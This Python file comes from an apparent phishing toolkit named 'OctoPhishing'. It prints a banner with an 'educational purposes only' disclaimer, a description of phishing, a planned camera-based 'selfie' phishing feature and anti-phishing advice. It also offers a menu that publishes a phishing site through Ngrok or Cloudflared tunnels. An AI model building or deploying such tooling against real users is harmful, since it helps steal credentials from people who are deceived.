import os # For clear terminal
from rich import print # For color ù
import Ngrok # For NGROK service 
import Cloudflared # For Cloudflared service 
from rich.prompt import Prompt # For color

def tool_information() :

    os.system('cls' if os.name == 'nt' else 'clear') # for clear terminal LINUX/WINDOWS OS
        
              
    print('''

[green]INFORMATION OCTOPHISHING[/green]
        
[green][1][/green] This program is for [yellow]EDUCATIONAL PURPOSES ONLY[/yellow], not for stealing data or committing computer crimes
              
[green][2][/green] My github account is this [yellow]https://github.com/Octopus-ssh/[/yellow]

[green][3][/green] [yellow]Phishing[/yellow] is a deceptive cyber attack aimed at acquiring sensitive information such as usernames, passwords, and financial details. 
    Perpetrators impersonate trustworthy entities through fraudulent emails, messages, or websites, often mimicking legitimate 
    institutions like banks or social media platforms. [yellow]Psychological manipulation[/yellow] tactics, urgency, enticing offers, and exploiting 
    current events are common in phishing attempts. Users must exercise caution, verify communication authenticity, and be wary of 
    unexpected requests for sensitive information to avoid falling prey to such schemes. Regular [yellow]cybersecurity awareness[/yellow] and education 
    are crucial for preventing successful phishing attacks.

[green][4][/green] My tool only requires [yellow]SINGULAR CHOICES VIA MENU[/yellow] and above all you can also select [yellow]the SELFIE FUNCTION (not yet)[/yellow] to be able to carry out phishing 
    attacks with the [yellow]FACIAL CAMERA[/yellow]
        
[green][5][/green] This is my cybersecurity blog [yellow]https://octopus-ssh.github.io/Octopus-ssh_WebBlog/[/yellow]
          
[green][6][/green] [yellow]Protecting oneself against phishing[/yellow] requires a combination of vigilance, awareness, and security practices. First and foremost, 
    individuals should be cautious when receiving unexpected emails, messages, or requests for sensitive information. [yellow]Verify the legitimacy[/yellow] of 
    the sender or website by double-checking email addresses and ensuring the use of secure connections (look for "https://"). [yellow]Avoid clicking 
    on suspicious links[/yellow] and refrain from downloading attachments from unknown sources.

    Employing [yellow]multi-factor authentication[/yellow] adds an extra layer of security by requiring additional verification beyond passwords. Regularly updating 
    and using reputable [yellow]antivirus software[/yellow] helps detect and mitigate potential phishing threats. Additionally, staying informed about [yellow]common phishing
    tactics[/yellow], such as urgency or enticing offers, enhances the ability to recognize and avoid such scams.

    [yellow]Cybersecurity education[/yellow] is paramount. Individuals should be aware of phishing techniques, attend awareness programs, and stay informed about the 
    latest cybersecurity trends. By combining these practices, individuals can significantly reduce the risk of falling victim to phishing attacks.

[green][+][/green] [yellow]THANKS FOR USING MY TOOL :)[/yellow]
        
        ''')
    
def web_service(directory) :

    os.system('cls' if os.name == 'nt' else 'clear') # for clear terminal LINUX/WINDOWS OS

    print('''
        
          
[green]CHOOSE YOUR WEB SERVICE[/green] 

[green][1][/green] [yellow]Ngrok (token requirement)[/yellow] 
          
[green][2][/green] [yellow]Cloudflared[/yellow] 

''')
    
    choice = int(Prompt.ask("\n\n[yellow][+] : ")) # insert an option

    if(choice == 1) :
        Ngrok.service(directory)
    
    if(choice == 2) :
        Cloudflared.deploy_to_vercel(directory)